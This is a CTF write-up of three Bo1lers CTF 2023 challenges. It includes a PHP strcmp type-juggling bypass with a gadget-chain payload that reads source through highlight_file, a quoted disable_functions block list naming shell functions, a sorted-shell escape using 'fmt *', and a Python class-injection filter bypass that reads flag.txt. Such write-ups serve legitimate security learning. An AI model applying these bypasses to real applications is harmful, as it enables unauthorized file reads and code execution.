---
title: "Bo1lers CTF 2023"
date: "2023-03-17"
tags: ["CTF", "bo1lers", "jeopardy"]
---

## Web

### php.galf

This challenge consists of a web page that presents itself as a php interpreter.
The page allow us to insert some commands and arguments in a text area, execute them, and print the output of the code.

Source code is provided.

The main page of the challenge runs the following code:

```php
define('block', TRUE);
require("parser/syntaxreader.php");
include("flag.php");
$code = NULL;
$args = NULL;
$result = NULL;
if (isset($_POST['code']) && isset($_POST['args'])) {
$code = $_POST['code'];
$args = $_POST['args'];
if (!isset($_COOKIE['DEBUG'])){
    $result = new syntaxreader($code, $args);
}
else if (strcmp($_COOKIE['DEBUG'], hash("md5", $flag)) == 0) {
        echo "Warning: Adming debugging enabled!";
        $result = new syntaxreader($code, $args, NULL);
    } else {
        $debug = array("Debugging Enabled!", 69);
        $result = new syntaxreader($code, $args, $debug);
    }
    $result->run();
}
```

The first thing we notice is that the page checks whether the `DEBUG` cookie is set, to presumably enable some extra debugging features. If the cookie's value is set to the hash of the flag, `NULL` will be passed to the syntax reader. Otherwise the value is passed.
The syntax reader class constructor code is the following:

```php
public function __construct($lines, $args, $debug = NULL) {
    $this->code = explode("\n", $lines);
    $this->args = $args;
    $this->result = $result;
    if (isset($debug)) {
        // disable debugging mode
        throw new noitpecxe(...$debug);
    }
}
```

This show that setting any value to the cookie different from the flag will throw an exception (notice that `noitpecxe` is the reverse of `exception`) defined in the following class:

```php
class noitpecxe extends Exception
{
    public $error_func = NULL;
    public function __construct($message, $code, $previous = null, $error_func = "printf") {
        // remove when PHP 5.3 is no longer supported
        echo "Construting exception";
        $this->error_func = $error_func;
        $this->message = $message;
        $previous = NULL;
        //dont care what ur code is LOL!
        $code = 69;
        parent::__construct($message, $code, $previous);
    }

    public function __toString() {
        $error_func = $this->error_func;
        $error_func($this->message);
        return __CLASS__ . ": {$this->code}\n";
    }
}
```

We're able to enable admin debug by setting the cookie as an array (from the storage tab of the browser we create the cookie as `DEBUG[0]` with empty value). In this way the comparison via `strcmp` will fail, returning NULL.. se [the comments here](https://www.php.net/manual/en/function.strcmp.php). We will need this debugging feature enable in the future.

The `syntaxreader` `run` function simply calls the `parse` function, defined in this way:

```php
public function parse() {
    $parsable = array("ohce");
    $arg_val = 0;
    $code = $this->code;
    $args = $this->args;
    $result = $this->result;
    for ($i = 0; $i < count($code); $i++) {
        $code[$i] = trim($code[$i]); // trim each code line
    }
    $args = explode(",", $args);
    for ($i = 0; $i < count($args); $i++) {
        $args[$i] = trim($args[$i]); // trim each arg
    }
    for ($i = 0; $i < count($code); $i++) {
        $token = explode(" ", $code[$i]); // split each code line by space
        for ($j = 0; $j < count($token); $j++) {
            try {
                if (!in_array($token[$j], $parsable)) { // look for ohce
                    throw new noitpecxe("Non-Parsable Keyword!\n", 101);
                }
                if ($args[$arg_val] == NULL) { // check exists arg
                    throw new noitpecxe("No Arguments!\n", 990);
                }
                if ($args[$arg_val] === "noitpecxe") { // check that arg is not exception
                    throw new noitpecxe("No Exceptions!\n", 100);
                }
                $class = new $token[$j]; // instantiate ohce
                $class($args, $arg_val);
                $arg_val++; // go to next arg
            } catch (noitpecxe $e) {
                echo "Error Executing Code! Error: " . $e . "\n";
            }
        }
    }
}
```

The code (commented by me) tells us that the only kind of command we can run is `ohce` (`echo` backwards), which is executed by instantiating and invoking the `ohce` class and proving the full argument vector to it. Moreover, `noitpecxe` is not allowed as argument.
By inspecting the `ohce` class, we can find that the argument can be either a string or another class between `orez_lum` and `orez_dda` (respectively `mul_zero` and `add_zero`):

```php
public function __invoke($args, $arg_val) {
    $this->args = $args[$arg_val];
    $arg_val++;
    $parsable = array("orez_lum", "orez_dda");
    if (in_array($this->args, $parsable)) {
        $class = new $this->args;
        $this->result = $class($args, $arg_val);
    } else {
        $this->result = $this->args;
    }
    $this->result = strrev($this->result) . "\n";
    echo $this->result;
}
```

In total, there are three operands allowed: `orez_lum`, `orez_dda` and `orez_vid`.
`orez_lum` and `orez_dda` are pretty similar, and their invocation works like this:

```php
public function __invoke($arg, $arg_val) {
    if ($arg[$arg_val] == NULL) {
        throw new noitpecxe("No Arguments!\n", 990);
    }
    if ($arg[$arg_val] === "noitpecxe") { //check that it is not exception
        throw new noitpecxe("No Exceptions!\n", 100);
    }
    //helpful for chaining expressions
    if (!is_numeric($arg[$arg_val])) {
        $class = new $arg[$arg_val];
        $arg_val++;
        $class($arg, $arg_val);
        $this->result = $class->result;
    }
    $this->result = $arg[$arg_val] + 0; //adding and subtracting zero does the same thing?
    return $this->result;
}
```

When invoked, this class allows us to instantiate and invoke any other class!

The `orez_vid` class is pretty different from the others:

```php
public function __construct($op=NULL, $result=NULL, $arg=NULL) { // one more argument
    $arg = NULL;
    $arg_val = NULL;
    if ($op == "div"){
        throw new noitpecxe("{$op} is not a valid operator!\n Results: {$result}\n", 0);
    }
}

public function __invoke($arg = "div", $arg_val = 0, $result = NULL) {
    if (!isset($_COOKIE['DEBUG'])) {  //just gonna prevent people from using this
        throw new noitpecxe("You need to enable debugging mode to access this!\n", 0);
    }
    if ($arg[$arg_val] == NULL) {
        throw new noitpecxe("No Arguments!\n", 990);
    }
    if ($arg[$arg_val] === "noitpecxe") {
        throw new noitpecxe("No Exceptions!\n", 100);
    }
    if (isset($result)) {
        throw new noitpecxe("No dividing by zero!\n", 0);
    }
    ///////////////////////////////////////////////////////////////////////////
    // smart to call the constructor so there is an exception! I was a genius!
    ///////////////////////////////////////////////////////////////////////////
    $class = new $arg[$arg_val]("div", $result, $arg);
    $arg_val++;
    $this->result = $arg[$arg_val] / 0; // dividing by zero??
    return $this->result;
}
```

We immediately notice that the check on the constructor is useless (we will never pass `div` as first argument).
The `__invoke` method checks whether the `DEBUG` cookie is set (we already bypassed this limitation in the beginning), and after other checks, instantiates the class given by the argument. This case is different from other methods since the instatiation is made by passing three arguments (probably made for its constructor since `div` is passed as first argument) and `arg` is passed as the last argument.

We can use this class to instantiate a `syntaxreader` and inject our arguments in the `debug` variable, which values is then passed into a `noitpecxe` (`exception`...).

The last argument of the constructor will be the function called in its `__toString` method, while the first argument will be its argument.

Lots of function are disabled from the `php.ini` file:

```text
disable_functions=exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,fopen
allow_url_fopen=Off
allow_url_include=Off
```

However, after looking through many functions, we found that `hightlight_file` (interally called by `show_source`) is not blocked.

So we constructed the following payload:

code:

```text
ohce
ohce
ohce
ohce
ohce
```

args:

```text
index.php, 0, asd, highlight_file, orez_dda, orez_vid, syntaxreader, 0, 0
```

The first four `ohce` commands will be used to print the strings `index.php`, `0`, `asd` and `highlight_file` (we want to include them in the `args` passed to the `noitpecxe`), while the last `ohce` will execute our payload.

To recap, the payload will be executed by instantiating a `orez_dda` (`add_zero`) class, which instantiates a `orez_vid` (`div_zero`) class, which, in turn, instantiates a `syntaxreader` with arguments `0`, `0` and our global `args` as `debug`. The `syntaxreader` will throw `noitpecxe` with the splat operator applied to our `arg` as arguments. When printed, the exception will execute `__toString` and call `highlight_file` with the argument `index.php`.

This way we obtain the flag.

## Misc

### abhs

This challenge featured a modified version of /bin/sh that, when prompted with a command, would reorder the letters in the name of the command and in each of the arguments so that the resulting characters in each string would be in alphabetical order.

The first command we can issue is `ls`. This shows us that the file `flag.txt` containing the flag is indeed in the current working directory.

We should then find a way to read this file. We can't use `cat`, as we would actually issue the command `act`, and the shell would indeed error out with `sh: act: not found`.

Luckily, `ls /bin` is the letters in each word are reordered, so we can use this command to list all the available commands, then filter them to keep only those that we can actually use.
We are left with a bunch of standard linux commands. After trying some of them, I noticed a command named `fmt`, which apparently is something we can use to format files.
We can simply issue the command `fmt *` to get the flag:
`bctf{gr34t_I_gu3ss_you_g0t_that_5orted_out:P}`

### ez-class

This challenge featured a service that would let us define Python classes.
The service would let us specify the name of the class, the base class to inherit from, the names, the arguments and the body of the methods we wanted in it.
It would save the resulting code to a file, exec() it and then instantiate an object of our class.

The first thing to note is that we can easily execute code by putting it inside the constructor of a class, as it gets called when the object is instantiated by the server.
The only problem is that the service put some restrictions on the characters we could use for the code inside our functions: a function `get_legal_code` would get called that used `input()` to get the code; the function would then throw an error if the code contained the characters "(", ")", "." or "\n".

An easy (and perhaps unintended?) way to solve this challenge is to request a class with the following structure:

```py
def A:
    def __init__(self):
        global get_legal_code; get_legal_code = input
```

This way, in the following requests, our code won't be checked against the blacklisted characters!
We can then simply request the following class:

```py
def B:
    def __init__(self)
        print(open("flag.txt", "r").read())
```

which will print out the flag:
`bctf{m3ta_c4l1abl3_b5e478f33eb890a2ee65}`
